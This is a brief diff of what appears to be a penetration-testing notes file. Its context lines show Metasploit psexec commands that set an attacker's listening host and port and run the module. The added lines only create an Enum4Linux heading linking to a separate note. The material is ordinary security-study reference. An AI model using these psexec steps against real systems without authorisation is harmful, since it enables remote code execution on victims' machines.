@@ -16,3 +16,7 @@ msf exploit(psexec) > set lhost AttackerIP
 msf exploit(psexec) > set lport Port
 msf exploit(psexec) > run
 ```
+
+# Enum4Linux
+#enum4linux
+see [[enum4linux]]
